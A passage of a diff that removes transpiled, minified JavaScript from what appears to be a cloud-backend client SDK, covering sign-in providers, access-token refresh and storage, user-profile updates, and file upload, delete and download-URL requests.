-                    case 4:
-                      if (i = e.sent, "ACCESS_TOKEN_DISABLED" !== i.data.code && "ACCESS_TOKEN_EXPIRED" !== i.data.code || -1 !== st.indexOf(t)) {
-                        e.next = 14;
-                        break;
-                      }
-                      return e.next = 8, this.oauth.refreshAccessToken();
-                    case 8:
-                      return e.next = 10, this.request(t, n, x(x({}, r), {}, {
-                        onUploadProgress: n.onUploadProgress
-                      }));
-                    case 10:
-                      if (a = e.sent, !a.data.code) {
-                        e.next = 13;
-                        break;
-                      }
-                      throw new ge({
-                        code: a.data.code,
-                        message: Re(a.data.message)
-                      });
-                    case 13:
-                      return e.abrupt("return", a.data);
-                    case 14:
-                      if (!i.data.code) {
-                        e.next = 16;
-                        break;
-                      }
-                      throw new ge({
-                        code: i.data.code,
-                        message: Re(i.data.message)
-                      });
-                    case 16:
-                      return e.abrupt("return", i.data);
-                    case 17:
-                    case "end":
-                      return e.stop();
-                  }
-                }, e, this);
-              }));
-              return function (t) {
-                return e.apply(this, arguments);
-              };
-            }()
-          }, {
-            key: "setRefreshToken",
-            value: function (e) {
-              var t = this._cache.keys,
-                n = t.accessTokenKey,
-                r = t.accessTokenExpireKey,
-                i = t.refreshTokenKey;
-              this._cache.removeStore(n), this._cache.removeStore(r), this._cache.setStore(i, e);
-            }
-          }]), e;
-        }(),
-        dt = {};
-      function ht(e) {
-        return dt[e];
-      }
-      var pt = function () {
-          function e(t) {
-            (0, v.default)(this, e), this.config = t, this._cache = Je(t.env), this._request = ht(t.env);
-          }
-          return (0, m.default)(e, [{
-            key: "setRefreshToken",
-            value: function (e) {
-              var t = this._cache.keys,
-                n = t.accessTokenKey,
-                r = t.accessTokenExpireKey,
-                i = t.refreshTokenKey;
-              this._cache.removeStore(n), this._cache.removeStore(r), this._cache.setStore(i, e);
-            }
-          }, {
-            key: "setAccessToken",
-            value: function (e, t) {
-              var n = this._cache.keys,
-                r = n.accessTokenKey,
-                i = n.accessTokenExpireKey;
-              this._cache.setStore(r, e), this._cache.setStore(i, t);
-            }
-          }, {
-            key: "refreshUserInfo",
-            value: function () {
-              var e = (0, l.default)(o.default.mark(function e() {
-                var t, n;
-                return o.default.wrap(function (e) {
-                  while (1) switch (e.prev = e.next) {
-                    case 0:
-                      return e.next = 2, this._request.send("auth.getUserInfo", {});
-                    case 2:
-                      return t = e.sent, n = t.data, e.abrupt("return", (this.setLocalUserInfo(n), n));
-                    case 5:
-                    case "end":
-                      return e.stop();
-                  }
-                }, e, this);
-              }));
-              return function () {
-                return e.apply(this, arguments);
-              };
-            }()
-          }, {
-            key: "setLocalUserInfo",
-            value: function (e) {
-              var t = this._cache.keys.userInfoKey;
-              this._cache.setStore(t, e);
-            }
-          }]), e;
-        }(),
-        gt = function () {
-          function e(t) {
-            if ((0, v.default)(this, e), !t) throw new ge({
-              code: "PARAM_ERROR",
-              message: "envId is not defined"
-            });
-            this._envId = t, this._cache = Je(this._envId), this._request = ht(this._envId), this.setUserInfo();
-          }
-          return (0, m.default)(e, [{
-            key: "linkWithTicket",
-            value: function (e) {
-              if ("string" != typeof e) throw new ge({
-                code: "PARAM_ERROR",
-                message: "ticket must be string"
-              });
-              return this._request.send("auth.linkWithTicket", {
-                ticket: e
-              });
-            }
-          }, {
-            key: "linkWithRedirect",
-            value: function (e) {
-              e.signInWithRedirect();
-            }
-          }, {
-            key: "updatePassword",
-            value: function (e, t) {
-              return this._request.send("auth.updatePassword", {
-                oldPassword: t,
-                newPassword: e
-              });
-            }
-          }, {
-            key: "updateEmail",
-            value: function (e) {
-              return this._request.send("auth.updateEmail", {
-                newEmail: e
-              });
-            }
-          }, {
-            key: "updateUsername",
-            value: function (e) {
-              if ("string" != typeof e) throw new ge({
-                code: "PARAM_ERROR",
-                message: "username must be a string"
-              });
-              return this._request.send("auth.updateUsername", {
-                username: e
-              });
-            }
-          }, {
-            key: "getLinkedUidList",
-            value: function () {
-              var e = (0, l.default)(o.default.mark(function e() {
-                var t, n, r, i;
-                return o.default.wrap(function (e) {
-                  while (1) switch (e.prev = e.next) {
-                    case 0:
-                      return e.next = 2, this._request.send("auth.getLinkedUidList", {});
-                    case 2:
-                      return t = e.sent, n = t.data, r = !1, i = n.users, e.abrupt("return", (i.forEach(function (e) {
-                        e.wxOpenId && e.wxPublicId && (r = !0);
-                      }), {
-                        users: i,
-                        hasPrimaryUid: r
-                      }));
-                    case 7:
-                    case "end":
-                      return e.stop();
-                  }
-                }, e, this);
-              }));
-              return function () {
-                return e.apply(this, arguments);
-              };
-            }()
-          }, {
-            key: "setPrimaryUid",
-            value: function (e) {
-              return this._request.send("auth.setPrimaryUid", {
-                uid: e
-              });
-            }
-          }, {
-            key: "unlink",
-            value: function (e) {
-              return this._request.send("auth.unlink", {
-                platform: e
-              });
-            }
-          }, {
-            key: "update",
-            value: function () {
-              var e = (0, l.default)(o.default.mark(function e(t) {
-                var n, r, i, a, s, u, c, l;
-                return o.default.wrap(function (e) {
-                  while (1) switch (e.prev = e.next) {
-                    case 0:
-                      return n = t.nickName, r = t.gender, i = t.avatarUrl, a = t.province, s = t.country, u = t.city, e.next = 8, this._request.send("auth.updateUserInfo", {
-                        nickName: n,
-                        gender: r,
-                        avatarUrl: i,
-                        province: a,
-                        country: s,
-                        city: u
-                      });
-                    case 8:
-                      c = e.sent, l = c.data, this.setLocalUserInfo(l);
-                    case 11:
-                    case "end":
-                      return e.stop();
-                  }
-                }, e, this);
-              }));
-              return function (t) {
-                return e.apply(this, arguments);
-              };
-            }()
-          }, {
-            key: "refresh",
-            value: function () {
-              var e = (0, l.default)(o.default.mark(function e() {
-                var t;
-                return o.default.wrap(function (e) {
-                  while (1) switch (e.prev = e.next) {
-                    case 0:
-                      return e.next = 2, this._request.oauth.getUserInfo();
-                    case 2:
-                      return t = e.sent, e.abrupt("return", (this.setLocalUserInfo(t), t));
-                    case 4:
-                    case "end":
-                      return e.stop();
-                  }
-                }, e, this);
-              }));
-              return function () {
-                return e.apply(this, arguments);
-              };
-            }()
-          }, {
-            key: "setUserInfo",
-            value: function () {
-              var e = this,
-                t = this._cache.keys.userInfoKey,
-                n = this._cache.getStore(t);
-              ["uid", "loginType", "openid", "wxOpenId", "wxPublicId", "unionId", "qqMiniOpenId", "email", "hasPassword", "customUserId", "nickName", "gender", "avatarUrl"].forEach(function (t) {
-                e[t] = n[t];
-              }), this.location = {
-                country: n.country,
-                province: n.province,
-                city: n.city
-              };
-            }
-          }, {
-            key: "setLocalUserInfo",
-            value: function (e) {
-              var t = this._cache.keys.userInfoKey;
-              this._cache.setStore(t, e), this.setUserInfo();
-            }
-          }]), e;
-        }(),
-        vt = function () {
-          function e(t) {
-            if ((0, v.default)(this, e), !t) throw new ge({
-              code: "PARAM_ERROR",
-              message: "envId is not defined"
-            });
-            this._cache = Je(t);
-            var n = this._cache.keys,
-              r = n.refreshTokenKey,
-              i = n.accessTokenKey,
-              o = n.accessTokenExpireKey,
-              a = this._cache.getStore(r),
-              s = this._cache.getStore(i),
-              u = this._cache.getStore(o);
-            this.credential = {
-              refreshToken: a,
-              accessToken: s,
-              accessTokenExpire: u
-            }, this.user = new gt(t);
-          }
-          return (0, m.default)(e, [{
-            key: "isAnonymousAuth",
-            get: function () {
-              return this.loginType === Xe.ANONYMOUS;
-            }
-          }, {
-            key: "isCustomAuth",
-            get: function () {
-              return this.loginType === Xe.CUSTOM;
-            }
-          }, {
-            key: "isWeixinAuth",
-            get: function () {
-              return this.loginType === Xe.WECHAT || this.loginType === Xe.WECHAT_OPEN || this.loginType === Xe.WECHAT_PUBLIC;
-            }
-          }, {
-            key: "loginType",
-            get: function () {
-              return this._cache.getStore(this._cache.keys.loginTypeKey);
-            }
-          }]), e;
-        }(),
-        mt = function (e) {
-          (0, d.default)(n, e);
-          var t = k(n);
-          function n() {
-            return (0, v.default)(this, n), t.apply(this, arguments);
-          }
-          return (0, m.default)(n, [{
-            key: "signIn",
-            value: function () {
-              var e = (0, l.default)(o.default.mark(function e() {
-                var t;
-                return o.default.wrap(function (e) {
-                  while (1) switch (e.prev = e.next) {
-                    case 0:
-                      return this._cache.updatePersistence("local"), e.next = 3, this._request.oauth.getAccessToken();
-                    case 3:
-                      return Ge(et), Ge(nt, {
-                        env: this.config.env,
-                        loginType: Xe.ANONYMOUS,
-                        persistence: "local"
-                      }), t = new vt(this.config.env), e.next = 8, t.user.refresh();
-                    case 8:
-                      return e.abrupt("return", t);
-                    case 9:
-                    case "end":
-                      return e.stop();
-                  }
-                }, e, this);
-              }));
-              return function () {
-                return e.apply(this, arguments);
-              };
-            }()
-          }, {
-            key: "linkAndRetrieveDataWithTicket",
-            value: function () {
-              var e = (0, l.default)(o.default.mark(function e(t) {
-                var n, r, i, a, s, u;
-                return o.default.wrap(function (e) {
-                  while (1) switch (e.prev = e.next) {
-                    case 0:
-                      return n = this._cache.keys, r = n.anonymousUuidKey, i = n.refreshTokenKey, a = this._cache.getStore(r), s = this._cache.getStore(i), e.next = 7, this._request.send("auth.linkAndRetrieveDataWithTicket", {
-                        anonymous_uuid: a,
-                        refresh_token: s,
-                        ticket: t
-                      });
-                    case 7:
-                      if (u = e.sent, !u.refresh_token) {
-                        e.next = 16;
-                        break;
-                      }
-                      return this._clearAnonymousUUID(), this.setRefreshToken(u.refresh_token), e.next = 13, this._request.refreshAccessToken();
-                    case 13:
-                      return Ge(rt, {
-                        env: this.config.env
-                      }), Ge(nt, {
-                        loginType: Xe.CUSTOM,
-                        persistence: "local"
-                      }), e.abrupt("return", {
-                        credential: {
-                          refreshToken: u.refresh_token
-                        }
-                      });
-                    case 16:
-                      throw new ge({
-                        message: "\u533F\u540D\u8F6C\u5316\u5931\u8D25"
-                      });
-                    case 17:
-                    case "end":
-                      return e.stop();
-                  }
-                }, e, this);
-              }));
-              return function (t) {
-                return e.apply(this, arguments);
-              };
-            }()
-          }, {
-            key: "_setAnonymousUUID",
-            value: function (e) {
-              var t = this._cache.keys,
-                n = t.anonymousUuidKey,
-                r = t.loginTypeKey;
-              this._cache.removeStore(n), this._cache.setStore(n, e), this._cache.setStore(r, Xe.ANONYMOUS);
-            }
-          }, {
-            key: "_clearAnonymousUUID",
-            value: function () {
-              this._cache.removeStore(this._cache.keys.anonymousUuidKey);
-            }
-          }]), n;
-        }(pt),
-        _t = function (e) {
-          (0, d.default)(n, e);
-          var t = k(n);
-          function n() {
-            return (0, v.default)(this, n), t.apply(this, arguments);
-          }
-          return (0, m.default)(n, [{
-            key: "signIn",
-            value: function () {
-              var e = (0, l.default)(o.default.mark(function e(t) {
-                var n, r;
-                return o.default.wrap(function (e) {
-                  while (1) switch (e.prev = e.next) {
-                    case 0:
-                      if ("string" == typeof t) {
-                        e.next = 2;
-                        break;
-                      }
-                      throw new ge({
-                        code: "PARAM_ERROR",
-                        message: "ticket must be a string"
-                      });
-                    case 2:
-                      return n = this._cache.keys.refreshTokenKey, e.next = 5, this._request.send("auth.signInWithTicket", {
-                        ticket: t,
-                        refresh_token: this._cache.getStore(n) || ""
-                      });
-                    case 5:
-                      if (r = e.sent, !r.refresh_token) {
-                        e.next = 15;
-                        break;
-                      }
-                      return this.setRefreshToken(r.refresh_token), e.next = 10, this._request.refreshAccessToken();
-                    case 10:
-                      return Ge(et), Ge(nt, {
-                        env: this.config.env,
-                        loginType: Xe.CUSTOM,
-                        persistence: this.config.persistence
-                      }), e.next = 14, this.refreshUserInfo();
-                    case 14:
-                      return e.abrupt("return", new vt(this.config.env));
-                    case 15:
-                      throw new ge({
-                        message: "\u81EA\u5B9A\u4E49\u767B\u5F55\u5931\u8D25"
-                      });
-                    case 16:
-                    case "end":
-                      return e.stop();
-                  }
-                }, e, this);
-              }));
-              return function (t) {
-                return e.apply(this, arguments);
-              };
-            }()
-          }]), n;
-        }(pt),
-        yt = function (e) {
-          (0, d.default)(n, e);
-          var t = k(n);
-          function n() {
-            return (0, v.default)(this, n), t.apply(this, arguments);
-          }
-          return (0, m.default)(n, [{
-            key: "signIn",
-            value: function () {
-              var e = (0, l.default)(o.default.mark(function e(t, n) {
-                var r, i, a, s, u;
-                return o.default.wrap(function (e) {
-                  while (1) switch (e.prev = e.next) {
-                    case 0:
-                      if ("string" == typeof t) {
-                        e.next = 2;
-                        break;
-                      }
-                      throw new ge({
-                        code: "PARAM_ERROR",
-                        message: "email must be a string"
-                      });
-                    case 2:
-                      return r = this._cache.keys.refreshTokenKey, e.next = 5, this._request.send("auth.signIn", {
-                        loginType: "EMAIL",
-                        email: t,
-                        password: n,
-                        refresh_token: this._cache.getStore(r) || ""
-                      });
-                    case 5:
-                      if (i = e.sent, a = i.refresh_token, s = i.access_token, u = i.access_token_expire, !a) {
-                        e.next = 22;
-                        break;
-                      }
-                      if (this.setRefreshToken(a), !s || !u) {
-                        e.next = 15;
-                        break;
-                      }
-                      this.setAccessToken(s, u), e.next = 17;
-                      break;
-                    case 15:
-                      return e.next = 17, this._request.refreshAccessToken();
-                    case 17:
-                      return e.next = 19, this.refreshUserInfo();
-                    case 19:
-                      return Ge(et), Ge(nt, {
-                        env: this.config.env,
-                        loginType: Xe.EMAIL,
-                        persistence: this.config.persistence
-                      }), e.abrupt("return", new vt(this.config.env));
-                    case 22:
-                      throw i.code ? new ge({
-                        code: i.code,
-                        message: "\u90AE\u7BB1\u767B\u5F55\u5931\u8D25: ".concat(i.message)
-                      }) : new ge({
-                        message: "\u90AE\u7BB1\u767B\u5F55\u5931\u8D25"
-                      });
-                    case 23:
-                    case "end":
-                      return e.stop();
-                  }
-                }, e, this);
-              }));
-              return function (t, n) {
-                return e.apply(this, arguments);
-              };
-            }()
-          }, {
-            key: "activate",
-            value: function () {
-              var e = (0, l.default)(o.default.mark(function e(t) {
-                return o.default.wrap(function (e) {
-                  while (1) switch (e.prev = e.next) {
-                    case 0:
-                      return e.abrupt("return", this._request.send("auth.activateEndUserMail", {
-                        token: t
-                      }));
-                    case 1:
-                    case "end":
-                      return e.stop();
-                  }
-                }, e, this);
-              }));
-              return function (t) {
-                return e.apply(this, arguments);
-              };
-            }()
-          }, {
-            key: "resetPasswordWithToken",
-            value: function () {
-              var e = (0, l.default)(o.default.mark(function e(t, n) {
-                return o.default.wrap(function (e) {
-                  while (1) switch (e.prev = e.next) {
-                    case 0:
-                      return e.abrupt("return", this._request.send("auth.resetPasswordWithToken", {
-                        token: t,
-                        newPassword: n
-                      }));
-                    case 1:
-                    case "end":
-                      return e.stop();
-                  }
-                }, e, this);
-              }));
-              return function (t, n) {
-                return e.apply(this, arguments);
-              };
-            }()
-          }]), n;
-        }(pt),
-        wt = function (e) {
-          (0, d.default)(n, e);
-          var t = k(n);
-          function n() {
-            return (0, v.default)(this, n), t.apply(this, arguments);
-          }
-          return (0, m.default)(n, [{
-            key: "signIn",
-            value: function () {
-              var e = (0, l.default)(o.default.mark(function e(t, n) {
-                var r, i, a, s, u;
-                return o.default.wrap(function (e) {
-                  while (1) switch (e.prev = e.next) {
-                    case 0:
-                      if ("string" == typeof t) {
-                        e.next = 2;
-                        break;
-                      }
-                      throw new ge({
-                        code: "PARAM_ERROR",
-                        message: "username must be a string"
-                      });
-                    case 2:
-                      return "string" != typeof n && (n = "", console.warn("password is empty")), r = this._cache.keys.refreshTokenKey, e.next = 6, this._request.send("auth.signIn", {
-                        loginType: Xe.USERNAME,
-                        username: t,
-                        password: n,
-                        refresh_token: this._cache.getStore(r) || ""
-                      });
-                    case 6:
-                      if (i = e.sent, a = i.refresh_token, s = i.access_token_expire, u = i.access_token, !a) {
-                        e.next = 23;
-                        break;
-                      }
-                      if (this.setRefreshToken(a), !u || !s) {
-                        e.next = 16;
-                        break;
-                      }
-                      this.setAccessToken(u, s), e.next = 18;
-                      break;
-                    case 16:
-                      return e.next = 18, this._request.refreshAccessToken();
-                    case 18:
-                      return e.next = 20, this.refreshUserInfo();
-                    case 20:
-                      return Ge(et), Ge(nt, {
-                        env: this.config.env,
-                        loginType: Xe.USERNAME,
-                        persistence: this.config.persistence
-                      }), e.abrupt("return", new vt(this.config.env));
-                    case 23:
-                      throw i.code ? new ge({
-                        code: i.code,
-                        message: "\u7528\u6237\u540D\u5BC6\u7801\u767B\u5F55\u5931\u8D25: ".concat(i.message)
-                      }) : new ge({
-                        message: "\u7528\u6237\u540D\u5BC6\u7801\u767B\u5F55\u5931\u8D25"
-                      });
-                    case 24:
-                    case "end":
-                      return e.stop();
-                  }
-                }, e, this);
-              }));
-              return function (t, n) {
-                return e.apply(this, arguments);
-              };
-            }()
-          }]), n;
-        }(pt),
-        bt = function () {
-          function e(t) {
-            (0, v.default)(this, e), this.config = t, this._cache = Je(t.env), this._request = ht(t.env), this._onAnonymousConverted = this._onAnonymousConverted.bind(this), this._onLoginTypeChanged = this._onLoginTypeChanged.bind(this), Ke(nt, this._onLoginTypeChanged);
-          }
-          return (0, m.default)(e, [{
-            key: "currentUser",
-            get: function () {
-              var e = this.hasLoginState();
-              return e && e.user || null;
-            }
-          }, {
-            key: "loginType",
-            get: function () {
-              return this._cache.getStore(this._cache.keys.loginTypeKey);
-            }
-          }, {
-            key: "anonymousAuthProvider",
-            value: function () {
-              return new mt(this.config);
-            }
-          }, {
-            key: "customAuthProvider",
-            value: function () {
-              return new _t(this.config);
-            }
-          }, {
-            key: "emailAuthProvider",
-            value: function () {
-              return new yt(this.config);
-            }
-          }, {
-            key: "usernameAuthProvider",
-            value: function () {
-              return new wt(this.config);
-            }
-          }, {
-            key: "signInAnonymously",
-            value: function () {
-              var e = (0, l.default)(o.default.mark(function e() {
-                return o.default.wrap(function (e) {
-                  while (1) switch (e.prev = e.next) {
-                    case 0:
-                      return e.abrupt("return", new mt(this.config).signIn());
-                    case 1:
-                    case "end":
-                      return e.stop();
-                  }
-                }, e, this);
-              }));
-              return function () {
-                return e.apply(this, arguments);
-              };
-            }()
-          }, {
-            key: "signInWithEmailAndPassword",
-            value: function () {
-              var e = (0, l.default)(o.default.mark(function e(t, n) {
-                return o.default.wrap(function (e) {
-                  while (1) switch (e.prev = e.next) {
-                    case 0:
-                      return e.abrupt("return", new yt(this.config).signIn(t, n));
-                    case 1:
-                    case "end":
-                      return e.stop();
-                  }
-                }, e, this);
-              }));
-              return function (t, n) {
-                return e.apply(this, arguments);
-              };
-            }()
-          }, {
-            key: "signInWithUsernameAndPassword",
-            value: function (e, t) {
-              return new wt(this.config).signIn(e, t);
-            }
-          }, {
-            key: "linkAndRetrieveDataWithTicket",
-            value: function () {
-              var e = (0, l.default)(o.default.mark(function e(t) {
-                return o.default.wrap(function (e) {
-                  while (1) switch (e.prev = e.next) {
-                    case 0:
-                      return this._anonymousAuthProvider || (this._anonymousAuthProvider = new mt(this.config)), Ke(rt, this._onAnonymousConverted), e.next = 3, this._anonymousAuthProvider.linkAndRetrieveDataWithTicket(t);
-                    case 3:
-                      return e.abrupt("return", e.sent);
-                    case 4:
-                    case "end":
-                      return e.stop();
-                  }
-                }, e, this);
-              }));
-              return function (t) {
-                return e.apply(this, arguments);
-              };
-            }()
-          }, {
-            key: "signOut",
-            value: function () {
-              var e = (0, l.default)(o.default.mark(function e() {
-                var t, n, r, i, a, s;
-                return o.default.wrap(function (e) {
-                  while (1) switch (e.prev = e.next) {
-                    case 0:
-                      if (this.loginType !== Xe.ANONYMOUS) {
-                        e.next = 2;
-                        break;
-                      }
-                      throw new ge({
-                        message: "\u533F\u540D\u7528\u6237\u4E0D\u652F\u6301\u767B\u51FA\u64CD\u4F5C"
-                      });
-                    case 2:
-                      if (t = this._cache.keys, n = t.refreshTokenKey, r = t.accessTokenKey, i = t.accessTokenExpireKey, a = this._cache.getStore(n), a) {
-                        e.next = 5;
-                        break;
-                      }
-                      return e.abrupt("return");
-                    case 5:
-                      return e.next = 7, this._request.send("auth.logout", {
-                        refresh_token: a
-                      });
-                    case 7:
-                      return s = e.sent, e.abrupt("return", (this._cache.removeStore(n), this._cache.removeStore(r), this._cache.removeStore(i), Ge(et), Ge(nt, {
-                        env: this.config.env,
-                        loginType: Xe.NULL,
-                        persistence: this.config.persistence
-                      }), s));
-                    case 9:
-                    case "end":
-                      return e.stop();
-                  }
-                }, e, this);
-              }));
-              return function () {
-                return e.apply(this, arguments);
-              };
-            }()
-          }, {
-            key: "signUpWithEmailAndPassword",
-            value: function () {
-              var e = (0, l.default)(o.default.mark(function e(t, n) {
-                return o.default.wrap(function (e) {
-                  while (1) switch (e.prev = e.next) {
-                    case 0:
-                      return e.abrupt("return", this._request.send("auth.signUpWithEmailAndPassword", {
-                        email: t,
-                        password: n
-                      }));
-                    case 1:
-                    case "end":
-                      return e.stop();
-                  }
-                }, e, this);
-              }));
-              return function (t, n) {
-                return e.apply(this, arguments);
-              };
-            }()
-          }, {
-            key: "sendPasswordResetEmail",
-            value: function () {
-              var e = (0, l.default)(o.default.mark(function e(t) {
-                return o.default.wrap(function (e) {
-                  while (1) switch (e.prev = e.next) {
-                    case 0:
-                      return e.abrupt("return", this._request.send("auth.sendPasswordResetEmail", {
-                        email: t
-                      }));
-                    case 1:
-                    case "end":
-                      return e.stop();
-                  }
-                }, e, this);
-              }));
-              return function (t) {
-                return e.apply(this, arguments);
-              };
-            }()
-          }, {
-            key: "onLoginStateChanged",
-            value: function (e) {
-              var t = this;
-              Ke(et, function () {
-                var n = t.hasLoginState();
-                e.call(t, n);
-              });
-              var n = this.hasLoginState();
-              e.call(this, n);
-            }
-          }, {
-            key: "onLoginStateExpired",
-            value: function (e) {
-              Ke(tt, e.bind(this));
-            }
-          }, {
-            key: "onAccessTokenRefreshed",
-            value: function (e) {
-              Ke(it, e.bind(this));
-            }
-          }, {
-            key: "onAnonymousConverted",
-            value: function (e) {
-              Ke(rt, e.bind(this));
-            }
-          }, {
-            key: "onLoginTypeChanged",
-            value: function (e) {
-              var t = this;
-              Ke(nt, function () {
-                var n = t.hasLoginState();
-                e.call(t, n);
-              });
-            }
-          }, {
-            key: "getAccessToken",
-            value: function () {
-              var e = (0, l.default)(o.default.mark(function e() {
-                return o.default.wrap(function (e) {
-                  while (1) switch (e.prev = e.next) {
-                    case 0:
-                      return e.next = 2, this._request.getAccessToken();
-                    case 2:
-                      return e.t0 = e.sent.accessToken, e.t1 = this.config.env, e.abrupt("return", {
-                        accessToken: e.t0,
-                        env: e.t1
-                      });
-                    case 5:
-                    case "end":
-                      return e.stop();
-                  }
-                }, e, this);
-              }));
-              return function () {
-                return e.apply(this, arguments);
-              };
-            }()
-          }, {
-            key: "hasLoginState",
-            value: function () {
-              var e = this._cache.keys,
-                t = e.accessTokenKey,
-                n = e.accessTokenExpireKey,
-                r = this._cache.getStore(t),
-                i = this._cache.getStore(n);
-              return this._request.oauth.isAccessTokenExpired(r, i) ? null : new vt(this.config.env);
-            }
-          }, {
-            key: "isUsernameRegistered",
-            value: function () {
-              var e = (0, l.default)(o.default.mark(function e(t) {
-                var n, r;
-                return o.default.wrap(function (e) {
-                  while (1) switch (e.prev = e.next) {
-                    case 0:
-                      if ("string" == typeof t) {
-                        e.next = 2;
-                        break;
-                      }
-                      throw new ge({
-                        code: "PARAM_ERROR",
-                        message: "username must be a string"
-                      });
-                    case 2:
-                      return e.next = 4, this._request.send("auth.isUsernameRegistered", {
-                        username: t
-                      });
-                    case 4:
-                      return n = e.sent, r = n.data, e.abrupt("return", r && r.isRegistered);
-                    case 7:
-                    case "end":
-                      return e.stop();
-                  }
-                }, e, this);
-              }));
-              return function (t) {
-                return e.apply(this, arguments);
-              };
-            }()
-          }, {
-            key: "getLoginState",
-            value: function () {
-              return Promise.resolve(this.hasLoginState());
-            }
-          }, {
-            key: "signInWithTicket",
-            value: function () {
-              var e = (0, l.default)(o.default.mark(function e(t) {
-                return o.default.wrap(function (e) {
-                  while (1) switch (e.prev = e.next) {
-                    case 0:
-                      return e.abrupt("return", new _t(this.config).signIn(t));
-                    case 1:
-                    case "end":
-                      return e.stop();
-                  }
-                }, e, this);
-              }));
-              return function (t) {
-                return e.apply(this, arguments);
-              };
-            }()
-          }, {
-            key: "shouldRefreshAccessToken",
-            value: function (e) {
-              this._request._shouldRefreshAccessTokenHook = e.bind(this);
-            }
-          }, {
-            key: "getUserInfo",
-            value: function () {
-              return this._request.send("auth.getUserInfo", {}).then(function (e) {
-                return e.code ? e : x(x({}, e.data), {}, {
-                  requestId: e.seqId
-                });
-              });
-            }
-          }, {
-            key: "getAuthHeader",
-            value: function () {
-              var e = this._cache.keys,
-                t = e.refreshTokenKey,
-                n = e.accessTokenKey,
-                r = this._cache.getStore(t);
-              return {
-                "x-cloudbase-credentials": this._cache.getStore(n) + "/@@/" + r
-              };
-            }
-          }, {
-            key: "_onAnonymousConverted",
-            value: function (e) {
-              var t = e.data.env;
-              t === this.config.env && this._cache.updatePersistence(this.config.persistence);
-            }
-          }, {
-            key: "_onLoginTypeChanged",
-            value: function (e) {
-              var t = e.data,
-                n = t.loginType,
-                r = t.persistence,
-                i = t.env;
-              i === this.config.env && (this._cache.updatePersistence(r), this._cache.setStore(this._cache.keys.loginTypeKey, n));
-            }
-          }]), e;
-        }(),
-        xt = function (e, t) {
-          t = t || De();
-          var n = ht(this.config.env),
-            r = e.cloudPath,
-            i = e.filePath,
-            o = e.onUploadProgress,
-            a = e.fileType,
-            s = void 0 === a ? "image" : a;
-          return n.send("storage.getUploadMetadata", {
-            path: r
-          }).then(function (e) {
-            var a = e.data,
-              u = a.url,
-              c = a.authorization,
-              l = a.token,
-              f = a.fileId,
-              d = a.cosFileId,
-              h = e.requestId,
-              p = {
-                key: r,
-                signature: c,
-                "x-cos-meta-fileid": d,
-                success_action_status: "201",
-                "x-cos-security-token": l
-              };
-            n.upload({
-              url: u,
-              data: p,
-              file: i,
-              name: r,
-              fileType: s,
-              onUploadProgress: o
-            }).then(function (e) {
-              201 === e.statusCode ? t(null, {
-                fileID: f,
-                requestId: h
-              }) : t(new ge({
-                code: "STORAGE_REQUEST_FAIL",
-                message: "STORAGE_REQUEST_FAIL: ".concat(e.data)
-              }));
-            }).catch(function (e) {
-              t(e);
-            });
-          }).catch(function (e) {
-            t(e);
-          }), t.promise;
-        },
-        kt = function (e, t) {
-          t = t || De();
-          var n = ht(this.config.env),
-            r = e.cloudPath;
-          return n.send("storage.getUploadMetadata", {
-            path: r
-          }).then(function (e) {
-            t(null, e);
-          }).catch(function (e) {
-            t(e);
-          }), t.promise;
-        },
-        St = function (e, t) {
-          var n = e.fileList;
-          if (t = t || De(), !n || !Array.isArray(n)) return {
-            code: "INVALID_PARAM",
-            message: "fileList\u5FC5\u987B\u662F\u975E\u7A7A\u7684\u6570\u7EC4"
-          };
-          var r,
-            i = y(n);
-          try {
-            for (i.s(); !(r = i.n()).done;) {
-              var o = r.value;
-              if (!o || "string" != typeof o) return {
-                code: "INVALID_PARAM",
-                message: "fileList\u7684\u5143\u7D20\u5FC5\u987B\u662F\u975E\u7A7A\u7684\u5B57\u7B26\u4E32"
-              };
-            }
-          } catch (s) {
-            i.e(s);
-          } finally {
-            i.f();
-          }
-          var a = {
-            fileid_list: n
-          };
-          return ht(this.config.env).send("storage.batchDeleteFile", a).then(function (e) {
-            e.code ? t(null, e) : t(null, {
-              fileList: e.data.delete_list,
-              requestId: e.requestId
-            });
-          }).catch(function (e) {
-            t(e);
-          }), t.promise;
-        },
-        Ot = function (e, t) {
-          var n = e.fileList;
-          t = t || De(), n && Array.isArray(n) || t(null, {
-            code: "INVALID_PARAM",
-            message: "fileList\u5FC5\u987B\u662F\u975E\u7A7A\u7684\u6570\u7EC4"
-          });
-          var r,
-            i = [],
-            o = y(n);
-          try {
-            for (o.s(); !(r = o.n()).done;) {
-              var a = r.value;
-              "object" == (0, u.default)(a) ? (a.hasOwnProperty("fileID") && a.hasOwnProperty("maxAge") || t(null, {
-                code: "INVALID_PARAM",
-                message: "fileList\u7684\u5143\u7D20\u5FC5\u987B\u662F\u5305\u542BfileID\u548CmaxAge\u7684\u5BF9\u8C61"
-              }), i.push({
-                fileid: a.fileID,
-                max_age: a.maxAge
-              })) : "string" == typeof a ? i.push({
-                fileid: a
-              }) : t(null, {
-                code: "INVALID_PARAM",
-                message: "fileList\u7684\u5143\u7D20\u5FC5\u987B\u662F\u5B57\u7B26\u4E32"
-              });
-            }
-          } catch (c) {
-            o.e(c);
-          } finally {
-            o.f();
-          }
-          var s = {
-            file_list: i
-          };
-          return ht(this.config.env).send("storage.batchGetDownloadUrl", s).then(function (e) {
-            e.code ? t(null, e) : t(null, {
-              fileList: e.data.download_list,
-              requestId: e.requestId
-            });
-          }).catch(function (e) {
-            t(e);
-          }), t.promise;
-        },
-        Tt = function () {
-          var e = (0, l.default)(o.default.mark(function e(t, n) {
-            var r, i, a, s;
-            return o.default.wrap(function (e) {
-              while (1) switch (e.prev = e.next) {
-                case 0:
-                  return r = t.fileID, e.next = 3, Ot.call(this, {
-                    fileList: [{
-                      fileID: r,
-                      maxAge: 600
-                    }]
-                  });
-                case 3:
-                  if (i = e.sent.fileList[0], "SUCCESS" === i.code) {
-                    e.next = 6;
-                    break;
-                  }
-                  return e.abrupt("return", n ? n(i) : new Promise(function (e) {
-                    e(i);
-                  }));
-                case 6:
-                  if (a = ht(this.config.env), s = i.download_url, s = encodeURI(s), n) {
-                    e.next = 10;
-                    break;
-                  }
-                  return e.abrupt("return", a.download({
-                    url: s
-                  }));
-                case 10:
-                  return e.t0 = n, e.next = 13, a.download({
-                    url: s
-                  });
-                case 13:
-                  e.t1 = e.sent, (0, e.t0)(e.t1);
-                case 15:
-                case "end":
-                  return e.stop();
-              }
-            }, e, this);
-          }));
-          return function (t, n) {
-            return e.apply(this, arguments);
-          };
-        }(),
-        Pt = function (e, t) {
-          var n,
-            r = e.name,
-            i = e.data,
-            o = e.query,
-            a = e.parse,
-            s = e.search,
-            u = e.timeout,
-            c = t || De();
